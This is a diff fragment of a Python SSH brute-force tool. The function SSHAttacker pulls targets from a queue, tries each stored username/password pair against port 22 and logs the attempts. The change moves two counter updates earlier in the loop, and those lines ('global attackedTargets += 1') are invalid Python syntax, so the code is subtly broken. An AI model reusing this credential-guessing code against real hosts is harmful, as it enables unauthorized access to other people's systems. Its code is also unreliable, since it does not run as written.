@@ -150,6 +150,8 @@ def SSHAttacker():
         # if(queOfTargets.empty)
         target = queOfTargets.get()
         logger(attackLog, "starting attack   {}".format(target))
+        global attackedTargets += 1
+        global targetsInQ -= 1
         for i in listOfLogins:
             logger(attackLog, "try   {} {} {}".format(target, i[1][0], i[1][1]))
             status = SSHCheck(target, 22, i[1][0], i[1][1])
@@ -163,8 +165,6 @@ def SSHAttacker():
                 logger(attackLog, "connection error   {}".format(target))
                 break
         logger(attackLog, "complete attack  {}".format(target))
-        global attackedTargets += 1
-        global targetsInQ -= 1
         listOfLogins.sort()
         listOfLogins.reverse()
 
